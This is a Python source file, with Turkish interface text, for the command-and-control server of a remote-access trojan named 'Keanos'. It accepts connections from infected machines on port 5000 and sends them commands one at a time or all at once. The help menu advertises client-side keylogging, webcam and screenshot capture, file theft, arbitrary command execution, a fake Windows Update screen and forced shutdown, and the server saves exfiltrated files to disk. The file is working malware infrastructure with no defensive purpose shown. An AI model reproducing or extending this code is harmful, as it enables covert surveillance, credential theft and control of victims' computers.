import socket
import threading
import select
import sys
import os
import datetime

clients = []
clients_lock = threading.Lock()
client_names = {}
client_hostnames = {}
client_connect_times = {}
client_disconnect_times = {}

KEANOS_ASCII = r"""
                               ___====-_  _-====___
                         _--^^^#####//      \\#####^^^--_
                      _-^##########// (    ) \\##########^-_
                     -############//  |\^^/|  \\############-
                   _/############//   (@::@)   \\############\_
                  /#############((     \\//     ))#############\
                 -###############\\    (oo)    //###############-
                -#################\\  / UUU \  //#################-
                -###################\\/  (_)  \//###################-
                _#/|##########/\######(   /|\   )######/\##########|\#_
                |/ |#/\#/\#/\/  \#/\##\  |||  /##/\#/  \/\#/\#/\| \
                ||/  V  V '   V  |||##\  ||| /##|||  V   '  V  V  \||
                ||| \ \|  | /  ||||||###\|||/###|||||  \ | /  |/ / |||
                |||  |_|_|_|  ||||||###########||||||   |_|_|_|  |||
                ||\  |||||    |||||###########||||||    |||||  /|||
"""

def broadcast_command(cmd):
    with clients_lock:
        for c in clients:
            try:
                c.send(cmd.encode())
            except:
                pass

def save_file_from_client(idx, ext, data):
    now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = "client_{}_{}_{}.{}".format(idx, now, ext, ext)
    with open(fname, "wb") as f:
        f.write(data)
    print("[+] Dosya kaydedildi: {}".format(fname))
    return fname

def list_clients():
    with clients_lock:
        print("\n--- BAĞLI CİHAZLAR ---")
        for idx, c in enumerate(clients):
            hostname = client_hostnames.get(c, client_names.get(c, "?"))
            connect_time = client_connect_times.get(c, "?")
            disconnect_time = client_disconnect_times.get(c, "-")
            print("[{}] {} | Bağlantı: {} | Ayrıldı: {}".format(idx, hostname, connect_time, disconnect_time))
        print("-----------------------\n")

def print_help():
    print(KEANOS_ASCII)
    print("""
Komutlar:
  list                - Bağlı clientları göster
  send <no> <komut>   - İstediğin clienta komut gönder (örn: send 0 screenshot)
  broadcast <komut>   - Tüm clientlara komut gönder
  exit                - Sunucuyu kapat
  help                - Komutları göster

Kullanışlı Komutlar (client tarafı):
  cmd <komut>         - Komut çalıştırır
  screenshot          - Ekran görüntüsü alır (dosya olarak kaydedilir)
  webcam              - Webcam fotoğrafı alır (dosya olarak kaydedilir)
  download <yol>      - Client dosya gönderir
  upload <yol>        - Server dosya gönderir
  fake_update         - Fake Windows Update
  alert <mesaj>       - Alert kutusu gösterir
  keylog_start        - Keylogger başlatır
  keylog_dump         - Keylogger verisini alır
  shutdown            - Bilgisayarı kapatır
  troll               - Komik hata popup'u
  exit                - Client bağlantısını kapatır
""")

def handle_client(conn, addr):
    try:
        name = "{}:{}".format(addr[0], addr[1])
        with clients_lock:
            clients.append(conn)
            client_names[conn] = name
            client_connect_times[conn] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        idx = None
        with clients_lock:
            for i, c in enumerate(clients):
                if c == conn:
                    idx = i
        print("[+] Yeni bağlantı: {} (No: {})".format(name, idx))
        file_mode = False
        file_data = b''
        file_ext = 'bin'
        hostname = None
        try:
            veri = conn.recv(4096)
            msg = veri.decode(errors="ignore")
            if msg.startswith("HOSTNAME:"):
                hostname = msg.split(":",1)[1]
                client_hostnames[conn] = hostname
                print("[+] Bağlı cihaz adı: {}".format(hostname))
            else:
                hostname = "Bilinmiyor"
                client_hostnames[conn] = hostname
        except:
            hostname = "Bilinmiyor"
            client_hostnames[conn] = hostname
        while True:
            veri = conn.recv(4096)
            if not veri:
                break
            try:
                msg = veri.decode(errors="ignore")
            except:
                msg = None
            if file_mode:
                if b"FILE_END" in veri:
                    file_data += veri.split(b"FILE_END")[0]
                    fname = save_file_from_client(idx, file_ext, file_data)
                    print("[{}] [Dosya alındı: {}]".format(name, fname))
                    file_mode = False
                    file_data = b''
                else:
                    file_data += veri
                continue
            if msg and msg.startswith("FILE_START"):
                file_mode = True
                file_data = b''
                if "screenshot" in msg:
                    file_ext = "screenshot"
                elif "webcam" in msg:
                    file_ext = "webcam"
                else:
                    file_ext = "bin"
                continue
            print("[{}] {}".format(hostname, msg if msg else '[BINARY DATA]'))
    except Exception as e:
        print("[HATA][{}] {}".format(name, e))
    finally:
        with clients_lock:
            if conn in clients:
                clients.remove(conn)
                del client_names[conn]
                if conn in client_hostnames:
                    del client_hostnames[conn]
                if conn in client_connect_times:
                    disconnect_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    client_disconnect_times[conn] = disconnect_time
                    print("[-] {} bağlantısı {} tarihinde ayrıldı.".format(name, disconnect_time))
                    del client_connect_times[conn]
        conn.close()
        print("[-] Bağlantı kapandı: {}".format(name))

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 5000))
    s.listen(100)
    print("[*] Sunucu başlatıldı. 5000 portunda dinliyor...")
    threading.Thread(target=command_loop, daemon=True).start()
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def command_loop():
    while True:
        try:
            cmd = input("[Keanos]> ").strip()
            if cmd == "list":
                list_clients()
            elif cmd.startswith("send "):
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    print("Kullanım: send <no> <komut>")
                    continue
                idx = int(parts[1])
                komut = parts[2]
                with clients_lock:
                    if 0 <= idx < len(clients):
                        clients[idx].send(komut.encode())
                        print("[+] Komut gönderildi.")
                    else:
                        print("Hatalı client numarası.")
            elif cmd.startswith("broadcast "):
                komut = cmd[len("broadcast "):]
                broadcast_command(komut)
                print("[+] Komut tüm clientlara gönderildi.")
            elif cmd == "exit":
                print("Sunucu kapatılıyor...")
                os._exit(0)
            elif cmd == "help":
                print_help()
            else:
                print("Bilinmeyen komut. help yazıp yardım alabilirsin.")
        except Exception as e:
            print("[HATA] {}".format(e))

if __name__ == "__main__":
    start_server()
